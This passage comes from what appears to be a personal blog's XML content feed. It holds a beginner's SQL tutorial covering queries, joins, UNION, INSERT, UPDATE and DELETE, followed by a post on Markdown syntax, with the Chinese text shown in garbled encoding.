alt="11"></p><ul><li>ç©ºå€¼åˆ¤æ–­ï¼šis null</li></ul><p>egï¼šselect * from p where color is null; æŸ¥è¯¢coloråˆ—ä¸­çš„ç©ºå€¼ã€‚</p><h4 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h4><p>order byï¼š è¯¥å…³é”®å­—ç”¨äºå¯¹ç»“æœé›†<strong>æŒ‰ç…§ä¸€ä¸ªåˆ—æˆ–è€…å¤šä¸ªåˆ—è¿›è¡Œæ’åº</strong>ã€‚é»˜è®¤æŒ‰ç…§å‡åºæ’åºã€‚å¦‚æœéœ€è¦æŒ‰ç…§é™åºæ’åºï¼Œå¯ä½¿ç”¨ DESC å…³é”®å­—ã€‚</p><p>æ ¼å¼ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">FROM</span> table_name<span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column1<span class="token punctuation">,</span> column2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token keyword">ASC</span><span class="token operator">|</span><span class="token keyword">DESC</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>column1, column2, â€¦ï¼šè¦æ’åºçš„å­—æ®µåç§°ï¼Œcolumn1å…¨å±€æ’åºï¼Œcolumn2,â€¦åˆ™æ˜¯å±€éƒ¨æ’åºï¼›</li><li>ASCï¼šè¡¨ç¤ºæŒ‰å‡åºæ’åºï¼›</li><li>DESCï¼šè¡¨ç¤ºæŒ‰é™åºæ’åºã€‚</li></ul><p><img src="/2023/04/03/sql/12.png" alt="12"></p><p>å¯ä»¥çœ‹å‡ºï¼šqtyæ˜¯é™åºçš„ï¼Œè€Œjnoåœ¨qtyç›¸åŒçš„æƒ…å†µä¸‹æ˜¯å‡åºçš„</p><h4 id="LIMIT"><a href="#LIMIT" class="headerlink" title="LIMIT"></a>LIMIT</h4><p>LIMITï¼šç”¨äºè§„å®šè¦è¿”å›çš„è®°å½•çš„æ•°ç›®ã€‚</p><p>æ ¼å¼ï¼šï¼ˆMySQLä¸­</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">FROM</span> table_name<span class="token keyword">LIMIT</span> number<span class="token punctuation">;</span> <span class="token comment">#numberä¸ºè¿”å›è®°å½•çš„æ•°ç›®</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/03/sql/16.png" alt="16"></p><h4 id="AS-SQL-åˆ«å"><a href="#AS-SQL-åˆ«å" class="headerlink" title="AS(SQL åˆ«å)"></a>AS(SQL åˆ«å)</h4><p>é€šè¿‡SQLï¼Œå¯ä»¥ä¸ºè¡¨åç§°æˆ–åˆ—åç§°æŒ‡å®šåˆ«åã€‚ </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#åˆ—çš„ SQL åˆ«åè¯­æ³•</span><span class="token keyword">SELECT</span> column_name <span class="token keyword">AS</span> alias_name<span class="token keyword">FROM</span> table_name<span class="token punctuation">;</span><span class="token comment">#è¡¨çš„ SQL åˆ«åè¯­æ³•</span><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">FROM</span> table_name <span class="token keyword">AS</span> alias_name<span class="token punctuation">;</span><span class="token comment">#Noteï¼šå¦‚æœåˆ—åç§°åŒ…å«ç©ºæ ¼ï¼Œè¦æ±‚ä½¿ç”¨åŒå¼•å·æˆ–æ–¹æ‹¬å·ï¼š</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ä¸‹é¢çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨åˆ«åå¾ˆæœ‰ç”¨ï¼š</p><ul><li>åœ¨æŸ¥è¯¢ä¸­æ¶‰åŠè¶…è¿‡ä¸€ä¸ªè¡¨</li><li>åœ¨æŸ¥è¯¢ä¸­ä½¿ç”¨äº†å‡½æ•°</li><li>åˆ—åç§°å¾ˆé•¿æˆ–è€…å¯è¯»æ€§å·®</li><li>éœ€è¦æŠŠä¸¤ä¸ªåˆ—æˆ–è€…å¤šä¸ªåˆ—ç»“åˆåœ¨ä¸€èµ·</li></ul><h4 id="JOIN"><a href="#JOIN" class="headerlink" title="JOIN"></a>JOIN</h4><p>JOIN ï¼šç”¨äºæŠŠæ¥è‡ªä¸¤ä¸ªæˆ–å¤šä¸ªè¡¨çš„è¡Œç»“åˆèµ·æ¥ï¼ŒåŸºäºè¿™äº›è¡¨ä¹‹é—´çš„<strong>å…±åŒå­—æ®µ</strong>ã€‚</p><p>åœ¨ä½¿ç”¨ <strong>join</strong> æ—¶ï¼Œ<strong>on</strong> å’Œ <strong>where</strong> æ¡ä»¶çš„åŒºåˆ«å¦‚ä¸‹ï¼š</p><ul><li><strong>on</strong> æ¡ä»¶æ˜¯åœ¨ç”Ÿæˆä¸´æ—¶è¡¨æ—¶ä½¿ç”¨çš„æ¡ä»¶ï¼Œå®ƒä¸ç®¡ <strong>on</strong> ä¸­çš„æ¡ä»¶æ˜¯å¦ä¸ºçœŸï¼Œéƒ½ä¼šè¿”å›å·¦è¾¹è¡¨ä¸­çš„è®°å½•ã€‚</li><li><strong>where</strong> æ¡ä»¶æ˜¯åœ¨ä¸´æ—¶è¡¨ç”Ÿæˆå¥½åï¼Œå†å¯¹ä¸´æ—¶è¡¨è¿›è¡Œè¿‡æ»¤çš„æ¡ä»¶ã€‚è¿™æ—¶å·²ç»æ²¡æœ‰ <strong>left join</strong> çš„å«ä¹‰ï¼ˆå¿…é¡»è¿”å›å·¦è¾¹è¡¨çš„è®°å½•ï¼‰äº†ï¼Œæ¡ä»¶ä¸ä¸ºçœŸçš„å°±å…¨éƒ¨è¿‡æ»¤æ‰ã€‚</li></ul><p><strong>A inner join B</strong> å–äº¤é›†ï¼›</p><p><strong>A left join B</strong> å– A å…¨éƒ¨ï¼ŒB æ²¡æœ‰å¯¹åº”çš„å€¼ä¸º nullï¼›</p><p><strong>A right join B</strong> å– B å…¨éƒ¨ A æ²¡æœ‰å¯¹åº”çš„å€¼ä¸º nullï¼›</p><p><strong>A full outer join B</strong> å–å¹¶é›†ï¼Œå½¼æ­¤æ²¡æœ‰å¯¹åº”çš„å€¼ä¸º nullã€‚</p><h5 id="INNER-JOIN"><a href="#INNER-JOIN" class="headerlink" title="INNER JOIN"></a>INNER JOIN</h5><p>INNER JOINï¼šåœ¨è¡¨ä¸­å­˜åœ¨è‡³å°‘ä¸€ä¸ªåŒ¹é…æ—¶è¿”å›è¡Œï¼›ç­‰åŒäºJOINã€‚</p><p>æ ¼å¼ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">FROM</span> table1<span class="token keyword">INNER</span> <span class="token keyword">JOIN</span> table2<span class="token keyword">ON</span> table1<span class="token punctuation">.</span>column_name<span class="token operator">=</span>table2<span class="token punctuation">.</span>column_name<span class="token punctuation">;</span><span class="token operator">or</span><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">FROM</span> table1<span class="token keyword">JOIN</span> table2<span class="token keyword">ON</span> table1<span class="token punctuation">.</span>column_name<span class="token operator">=</span>table2<span class="token punctuation">.</span>column_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>column_name(s)ï¼šè¦æ˜¾ç¤ºçš„åˆ—åã€‚</li><li>table1ï¼šè¡¨1çš„åç§°ã€‚</li><li>table2ï¼šè¡¨2çš„åç§°ã€‚</li><li>tablex.column_nameï¼šè¡¨ä¸­ç”¨äºè¿æ¥çš„åˆ—åã€‚</li></ul><p><img src="/2023/04/03/sql/17.png" alt="17"></p><h5 id="LEFT-JOIN"><a href="#LEFT-JOIN" class="headerlink" title="LEFT JOIN"></a>LEFT JOIN</h5><p>LEFT JOINï¼šä»å·¦è¡¨ï¼ˆtable1ï¼‰è¿”å›æ‰€æœ‰çš„è¡Œï¼Œå³ä½¿å³è¡¨ï¼ˆtable2ï¼‰ä¸­æ²¡æœ‰åŒ¹é…ã€‚å¦‚æœå³è¡¨ä¸­æ²¡æœ‰åŒ¹é…ï¼Œåˆ™ç»“æœä¸º NULLã€‚</p><p>æ ¼å¼ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">FROM</span> table1<span class="token keyword">LEFT</span> <span class="token keyword">JOIN</span> table2<span class="token keyword">ON</span> table1<span class="token punctuation">.</span>column_name<span class="token operator">=</span>table2<span class="token punctuation">.</span>column_name<span class="token punctuation">;</span><span class="token operator">or</span><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">FROM</span> table1<span class="token keyword">LEFT</span> <span class="token keyword">OUTER</span> <span class="token keyword">JOIN</span> table2<span class="token keyword">ON</span> table1<span class="token punctuation">.</span>column_name<span class="token operator">=</span>table2<span class="token punctuation">.</span>column_name<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/03/sql/18.png" alt="18"></p><h5 id="RIGHT-JOIN"><a href="#RIGHT-JOIN" class="headerlink" title="RIGHT JOIN"></a>RIGHT JOIN</h5><p>ä¸LEFT JOINç›¸åï¼Œä½¿ç”¨ç›¸åŒæŠŠleft æ”¹ä¸º rightå³å¯ã€‚</p><h5 id="FULL-JOIN"><a href="#FULL-JOIN" class="headerlink" title="FULL JOIN"></a>FULL JOIN</h5><p>FULL OUTER JOINï¼šå…³é”®å­—åªè¦å·¦è¡¨ï¼ˆtable1ï¼‰å’Œå³è¡¨ï¼ˆtable2ï¼‰å…¶ä¸­ä¸€ä¸ªè¡¨ä¸­å­˜åœ¨åŒ¹é…ï¼Œåˆ™è¿”å›è¡Œï¼›ç»“åˆäº† LEFT JOIN å’Œ RIGHT JOIN çš„ç»“æœã€‚</p><p>æ ¼å¼ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">FROM</span> table1<span class="token keyword">FULL</span> <span class="token keyword">OUTER</span> <span class="token keyword">JOIN</span> table2<span class="token keyword">ON</span> table1<span class="token punctuation">.</span>column_name<span class="token operator">=</span>table2<span class="token punctuation">.</span>column_name<span class="token punctuation">;</span><span class="token operator">&gt;</span>_<span class="token operator">&lt;</span> æˆ‘ç”µè„‘ç‰ˆæœ¬å¥½åƒä¸æ”¯æŒ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="UNION"><a href="#UNION" class="headerlink" title="UNION"></a>UNION</h4><p>UNIONï¼šåˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ª SELECT è¯­å¥çš„ç»“æœã€‚</p><p><strong>Noteï¼š</strong>UNION å†…éƒ¨çš„æ¯ä¸ª SELECT è¯­å¥å¿…é¡»æ‹¥æœ‰<strong>ç›¸åŒæ•°é‡çš„åˆ—</strong>ã€‚åˆ—ä¹Ÿå¿…é¡»æ‹¥æœ‰<strong>ç›¸ä¼¼çš„æ•°æ®ç±»å‹</strong>ã€‚åŒæ—¶ï¼Œæ¯ä¸ª SELECT è¯­å¥ä¸­çš„<strong>åˆ—çš„é¡ºåºå¿…é¡»ç›¸åŒ</strong>ã€‚</p><p>æ ¼å¼ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#UNION æ“ä½œç¬¦é€‰å–ä¸åŒçš„å€¼ã€‚å¦‚æœå…è®¸é‡å¤çš„å€¼ï¼Œåˆ™ä½¿ç”¨UNION ALLï¼›</span><span class="token comment">#UNION ç»“æœé›†ä¸­çš„åˆ—åç­‰äºUNIONä¸­ç¬¬ä¸€ä¸ª SELECT è¯­å¥ä¸­çš„åˆ—åã€‚</span><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">FROM</span> table1<span class="token keyword">UNION</span><span class="token keyword">SELECT</span> column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">FROM</span> table2<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/03/sql/19.png" alt="19"></p><h3 id="æ•°æ®æ›´æ–°è¯­å¥"><a href="#æ•°æ®æ›´æ–°è¯­å¥" class="headerlink" title="æ•°æ®æ›´æ–°è¯­å¥"></a>æ•°æ®æ›´æ–°è¯­å¥</h3><h4 id="æ’å…¥ï¼šINSERT-INTOè¯­å¥"><a href="#æ’å…¥ï¼šINSERT-INTOè¯­å¥" class="headerlink" title="æ’å…¥ï¼šINSERT INTOè¯­å¥"></a>æ’å…¥ï¼šINSERT INTOè¯­å¥</h4><p>INSERT INTOï¼šç”¨äºå‘è¡¨ä¸­æ’å…¥æ–°è®°å½•ã€‚</p><p>æ ¼å¼1 ï¼šæ— éœ€æŒ‡å®šè¦æ’å…¥æ•°æ®çš„åˆ—åï¼Œåªéœ€æä¾›è¢«æ’å…¥çš„å€¼å³å¯ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> table_name<span class="token keyword">VALUES</span> <span class="token punctuation">(</span>value1<span class="token punctuation">,</span>value2<span class="token punctuation">,</span>value3<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ ¼å¼2ï¼šæŒ‡å®šåˆ—ååŠè¢«æ’å…¥çš„å€¼ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> table_name <span class="token punctuation">(</span>column1<span class="token punctuation">,</span>column2<span class="token punctuation">,</span>column3<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token keyword">VALUES</span> <span class="token punctuation">(</span>value1<span class="token punctuation">,</span>value2<span class="token punctuation">,</span>value3<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>columnä¸ºtable_nameè¡¨ä¸­çš„å­—æ®µï¼›</li></ul><p><img src="/2023/04/03/sql/13.png" alt="13"></p><h4 id="æ›´æ–°ï¼šUPDATEè¯­å¥"><a href="#æ›´æ–°ï¼šUPDATEè¯­å¥" class="headerlink" title="æ›´æ–°ï¼šUPDATEè¯­å¥"></a>æ›´æ–°ï¼šUPDATEè¯­å¥</h4><p>UPDATEï¼šç”¨äºæ›´æ–°è¡¨ä¸­<strong>å·²å­˜åœ¨</strong>çš„è®°å½•ã€‚</p><p>æ ¼å¼ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">UPDATE</span> table_name<span class="token keyword">SET</span> column1 <span class="token operator">=</span> value1<span class="token punctuation">,</span> column2 <span class="token operator">=</span> value2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">WHERE</span> condition<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>able_nameï¼šè¦ä¿®æ”¹çš„è¡¨åç§°ï¼›</li><li>column1, column2, â€¦ï¼šè¦ä¿®æ”¹çš„å­—æ®µåç§°ï¼Œå¯ä»¥ä¸ºå¤šä¸ªå­—æ®µï¼›</li><li>value1, value2, â€¦ï¼šè¦ä¿®æ”¹çš„å€¼ï¼Œå¯ä»¥ä¸ºå¤šä¸ªå€¼ï¼›</li><li>conditionï¼šä¿®æ”¹æ¡ä»¶ï¼Œç”¨äºæŒ‡å®šå“ªäº›æ•°æ®è¦ä¿®æ”¹ã€‚</li></ul><p><img src="/2023/04/03/sql/14.png" alt="14"></p><p><strong>Noteï¼š</strong>updateæ›´æ–°æ•°æ®æ—¶ï¼Œåˆ‡è®°ä¸è¦å¿˜è®°å¸¦whereå­å¥ï¼Œå¦åˆ™ä½ çš„è¡¨ä¸­çš„ç›¸åº”å­—æ®µçš„å€¼éƒ½ä¼šè¢«ä¿®æ”¹ã€‚</p><h4 id="åˆ é™¤ï¼šDELETEè¯­å¥"><a href="#åˆ é™¤ï¼šDELETEè¯­å¥" class="headerlink" title="åˆ é™¤ï¼šDELETEè¯­å¥"></a>åˆ é™¤ï¼šDELETEè¯­å¥</h4><p>DELETEï¼šç”¨äºåˆ é™¤è¡¨ä¸­çš„è¡Œã€‚</p><p>æ ¼å¼ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DELETE</span> <span class="token keyword">FROM</span> table_name<span class="token keyword">WHERE</span> condition<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p>table_nameï¼šè¦åˆ é™¤çš„è¡¨åç§°;</p></li><li><p>conditionï¼šåˆ é™¤æ¡ä»¶ï¼Œç”¨äºæŒ‡å®šå“ªäº›æ•°æ®è¦åˆ é™¤ã€‚</p></li></ul><p><img src="/2023/04/03/sql/15.png" alt="15"></p><p><strong>Noteï¼š</strong></p><ul><li>deleteåˆ é™¤æ•°æ®æ—¶ï¼Œåˆ‡è®°ä¸è¦å¿˜è®°å¸¦whereå­å¥ï¼Œå¦åˆ™ä½ è¡¨ä¸­çš„æ‰€æœ‰è®°å½•éƒ½ä¼šè¢«ä¿®æ”¹ã€‚</li><li>å¯ä»¥åœ¨ä¸åˆ é™¤è¡¨çš„æƒ…å†µä¸‹ï¼Œåˆ é™¤è¡¨ä¸­æ‰€æœ‰çš„è¡Œã€‚è¿™æ„å‘³ç€è¡¨ç»“æ„ã€å±æ€§ã€ç´¢å¼•å°†ä¿æŒä¸å˜ï¼šDELETE FROM <em>table_name</em>;</li></ul><h4 id="å¤åˆ¶ï¼šINSERT-INTO-SELECT"><a href="#å¤åˆ¶ï¼šINSERT-INTO-SELECT" class="headerlink" title="å¤åˆ¶ï¼šINSERT INTO SELECT"></a>å¤åˆ¶ï¼šINSERT INTO SELECT</h4><p>INSERT INTO SELECT è¯­å¥ä»ä¸€ä¸ªè¡¨å¤åˆ¶æ•°æ®ï¼Œç„¶åæŠŠæ•°æ®æ’å…¥åˆ°ä¸€ä¸ª<strong>å·²å­˜åœ¨çš„è¡¨ä¸­</strong>ã€‚ç›®æ ‡è¡¨ä¸­ä»»ä½•å·²å­˜åœ¨çš„è¡Œéƒ½ä¸ä¼šå—å½±å“ã€‚</p><p>æ ¼å¼ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> table2<span class="token punctuation">[</span><span class="token punctuation">(</span>column_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">SELECT</span> <span class="token operator">*</span><span class="token punctuation">[</span>columns_name<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">FROM</span> table1<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/04/03/sql/20.png" alt="20"></p><h3 id="è§†å›¾-å¾…å†™"><a href="#è§†å›¾-å¾…å†™" class="headerlink" title="è§†å›¾(å¾…å†™)"></a>è§†å›¾(å¾…å†™)</h3><h3 id="SQLå‡½æ•°-å¾…å†™"><a href="#SQLå‡½æ•°-å¾…å†™" class="headerlink" title="SQLå‡½æ•°(å¾…å†™)"></a>SQLå‡½æ•°(å¾…å†™)</h3>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>My First Blog</title>
      <link href="/2023/04/02/start-blog/"/>
      <url>/2023/04/02/start-blog/</url>
      
        <content type="html"><![CDATA[<h1 id="Markdown-æ ‡é¢˜"><a href="#Markdown-æ ‡é¢˜" class="headerlink" title="Markdown æ ‡é¢˜"></a>Markdown æ ‡é¢˜</h1><p>â€œ#â€   =&gt; ä¸€çº§æ ‡é¢˜<br>â€œ##â€ =&gt; äºŒçº§æ ‡é¢˜ï¼Œä»¥æ­¤ç±»æ¨ï¼Œä¸€å…±å…­çº§æ ‡é¢˜ã€‚</p><h1 id="Markdownæ–‡æœ¬"><a href="#Markdownæ–‡æœ¬" class="headerlink" title="Markdownæ–‡æœ¬"></a>Markdownæ–‡æœ¬</h1><ul><li>æ–œä½“ï¼šå¯ä»¥åœ¨éœ€è¦æ ‡æ³¨ä¸ºæ–œä½“æ–‡æœ¬å‰åŠæ–œä½“æ–‡æœ¬ç»“å°¾ï¼Œè¾“å…¥ä¸€ä¸ªæ˜Ÿå·<code>*</code>æˆ–è€…ä¸€ä¸ªä¸‹åˆ’çº¿ <code>_</code>ï¼›<br>egï¼š<code>*æ–œä½“*</code> â‡’ <em>æ–œä½“</em>   <code>_æ–œä½“_</code>â‡’ <em>æ–œä½“</em></li><li>ç²—ä½“ï¼š<code>**</code>æˆ–è€…<code>__</code></li><li>æ–œç²—ä½“ï¼š<code>***</code>æˆ–è€…<code>___</code></li></ul><h1 id="Markdownåˆ—è¡¨"><a href="#Markdownåˆ—è¡¨" class="headerlink" title="Markdownåˆ—è¡¨"></a>Markdownåˆ—è¡¨</h1><p>1ï¼‰æ— åºåˆ—è¡¨ï¼šä½¿ç”¨æ˜Ÿå·(<code>*</code>)ã€åŠ å·(<code>+</code>)æˆ–æ˜¯å‡å·(<code>-</code>)ï¼Œå†åŠ ä¸€ä¸ªç©ºæ ¼ä½œä¸ºåˆ—è¡¨æ ‡è®°ï¼›<br>2ï¼‰æœ‰åºåˆ—è¡¨ï¼šä½¿ç”¨æ•°å­—å¹¶åŠ ä¸Š <code>.</code> å·ï¼Œå†åŠ ä¸€ä¸ªç©ºæ ¼ä½œä¸ºåˆ—è¡¨æ ‡è®°ï¼›<br>noteï¼šå¦‚æœè¦æ§åˆ¶åˆ—è¡¨çš„å±‚çº§ï¼Œåˆ™éœ€è¦åœ¨ç¬¦å· å‰ä½¿ç”¨ <code>tab</code>ï¼Œå¦‚ä¸‹ï¼š</p><ul><li>æ— åºåˆ—è¡¨ 1</li><li>æ— åºåˆ—è¡¨ 2<ul><li>æ— åºåˆ—è¡¨ 2.1</li><li>æ— åºåˆ—è¡¨ 2.2</li></ul></li></ul><h1 id="Markdowné“¾æ¥"><a href="#Markdowné“¾æ¥" class="headerlink" title="Markdowné“¾æ¥"></a>Markdowné“¾æ¥</h1><p>æ ¼å¼ï¼š<code>[é“¾æ¥åç§°](é“¾æ¥åœ°å€)</code>æˆ–è€…&lt;é“¾æ¥åœ°å€&gt;<br>eg:<a href="https://blog.csdn.net/qq_61670993?spm=1018.2226.3001.5343">XiaozaYa</a>æˆ–è€…<a href="https://blog.csdn.net/qq_61670993?spm=1018.2226.3001.5343">https://blog.csdn.net/qq_61670993?spm=1018.2226.3001.5343</a></p><h1 id="Markdownå¼•ç”¨"><a href="#Markdownå¼•ç”¨" class="headerlink" title="Markdownå¼•ç”¨"></a>Markdownå¼•ç”¨</h1><p>æ ¼å¼ï¼šåœ¨ç¬¦å· <code>&gt;</code> åé¢ä¹¦å†™æ–‡å­—ï¼Œæˆ–è€…åŠ ä¸€ä¸ªç©ºæ ¼å†åŠ æ–‡å­—ï¼›<br>egï¼š</p><blockquote><p>hello:<br>Welcome</p></blockquote><p>é™¤æ­£å¸¸å¼•ç”¨å¤–ï¼Œè¿˜å¯ä»¥åµŒå¥—ï¼Œä¸€ä¸ª <code>&gt;</code> ç¬¦å·åœ¨ç¬¬ä¸€å±‚ï¼Œä¸¤ä¸ª <code>&gt;</code> ç¬¦å·æ˜¯ç¬¬äºŒå±‚ï¼Œä»¥æ­¤ç±»æ¨ï¼Œå¦‚ä¸‹ï¼š</p><blockquote><p>è¿™æ˜¯ä¸€ä¸ªå¼•ç”¨:</p><blockquote><p>welcome</p><blockquote><p>å¿«æ¥ç©å•Šï¼</p></blockquote></blockquote></blockquote><h1 id="Markdownåˆ†å‰²çº¿"><a href="#Markdownåˆ†å‰²çº¿" class="headerlink" title="Markdownåˆ†å‰²çº¿"></a>Markdownåˆ†å‰²çº¿</h1><h2 id="æ ¼å¼ï¼šåœ¨ä¸€è¡Œä¸­ç”¨ä¸‰ä¸ª-æˆ–è€…-æ¥å»ºç«‹ä¸€ä¸ªåˆ†éš”çº¿ï¼ŒåŒæ—¶éœ€è¦åœ¨åˆ†éš”çº¿çš„ä¸Šé¢ç©ºä¸€è¡Œï¼›å¦‚æœä¸ç•™ç©ºæ ¼ï¼Œå½“ç”¨-æ—¶å°±ä¼šå˜æˆæ”¾å¤§ä¸Šé¢çš„å­—ï¼›eg-Welcome-æˆ‘çˆ±ä½ ï¼"><a href="#æ ¼å¼ï¼šåœ¨ä¸€è¡Œä¸­ç”¨ä¸‰ä¸ª-æˆ–è€…-æ¥å»ºç«‹ä¸€ä¸ªåˆ†éš”çº¿ï¼ŒåŒæ—¶éœ€è¦åœ¨åˆ†éš”çº¿çš„ä¸Šé¢ç©ºä¸€è¡Œï¼›å¦‚æœä¸ç•™ç©ºæ ¼ï¼Œå½“ç”¨-æ—¶å°±ä¼šå˜æˆæ”¾å¤§ä¸Šé¢çš„å­—ï¼›eg-Welcome-æˆ‘çˆ±ä½ ï¼" class="headerlink" title="æ ¼å¼ï¼šåœ¨ä¸€è¡Œä¸­ç”¨ä¸‰ä¸ª - æˆ–è€… * æ¥å»ºç«‹ä¸€ä¸ªåˆ†éš”çº¿ï¼ŒåŒæ—¶éœ€è¦åœ¨åˆ†éš”çº¿çš„ä¸Šé¢ç©ºä¸€è¡Œï¼›å¦‚æœä¸ç•™ç©ºæ ¼ï¼Œå½“ç”¨-æ—¶å°±ä¼šå˜æˆæ”¾å¤§ä¸Šé¢çš„å­—ï¼›eg:Welcome!***æˆ‘çˆ±ä½ ï¼"></a>æ ¼å¼ï¼šåœ¨ä¸€è¡Œä¸­ç”¨ä¸‰ä¸ª <code>-</code> æˆ–è€… <code>*</code> æ¥å»ºç«‹ä¸€ä¸ªåˆ†éš”çº¿ï¼ŒåŒæ—¶éœ€è¦åœ¨åˆ†éš”çº¿çš„ä¸Šé¢ç©ºä¸€è¡Œï¼›å¦‚æœä¸ç•™ç©ºæ ¼ï¼Œå½“ç”¨<code>-</code>æ—¶å°±ä¼šå˜æˆæ”¾å¤§ä¸Šé¢çš„å­—ï¼›<br>eg:<br>Welcome!<br>***<br>æˆ‘çˆ±ä½ ï¼</h2><hr><hr><h1 id="Markdownåˆ é™¤çº¿"><a href="#Markdownåˆ é™¤çº¿" class="headerlink" title="Markdownåˆ é™¤çº¿"></a>Markdownåˆ é™¤çº¿</h1><p>æ ¼å¼ï¼šåœ¨éœ€è¦åˆ é™¤çš„æ–‡å­—å‰åå„ä½¿ç”¨ä¸¤ä¸ª <code>~</code>ï¼›<br>egï¼š<br><del>åˆ é™¤çº¿</del></p><h1 id="Markdownä¸‹åˆ’çº¿"><a href="#Markdownä¸‹åˆ’çº¿" class="headerlink" title="Markdownä¸‹åˆ’çº¿"></a>Markdownä¸‹åˆ’çº¿</h1><p>æ ¼å¼ï¼šåœ¨éœ€è¦æ·»åŠ ä¸‹åˆ’çº¿çš„æ–‡å­—é¦–éƒ¨å’Œå°¾éƒ¨åŠ ä¸Š <code>&lt;u&gt;æ–‡æœ¬&lt;/u&gt;</code>ï¼›<br>egï¼š<br><u>ä¸‹åˆ’çº¿</u></p><h1 id="Markdownè¡¨æ ¼"><a href="#Markdownè¡¨æ ¼" class="headerlink" title="Markdownè¡¨æ ¼"></a>Markdownè¡¨æ ¼</h1><p>æ ¼å¼ï¼šè¡¨æ ¼ä½¿ç”¨ <code>|</code> æ¥åˆ†éš”ä¸åŒçš„å•å…ƒæ ¼ï¼Œä½¿ç”¨ <code>-</code> æ¥åˆ†éš”è¡¨å¤´å’Œå…¶ä»–è¡Œï¼Œå¦‚æœæƒ³è°ƒæ•´è¡¨æ ¼çš„å·¦å¯¹é½ã€å³å¯¹é½ã€å±…ä¸­å¯¹é½:</p><ul><li><code>:-</code>ï¼šå°†è¡¨å¤´åŠå•å…ƒæ ¼çš„å†…å®¹å·¦å¯¹é½ï¼›</li><li><code>-:</code>ï¼šå°†è¡¨å¤´åŠå•å…ƒæ ¼çš„å†…å®¹å·¦å¯¹é½ï¼›</li><li><code>:-:</code>ï¼šå°†è¡¨å¤´åŠå•å…ƒæ 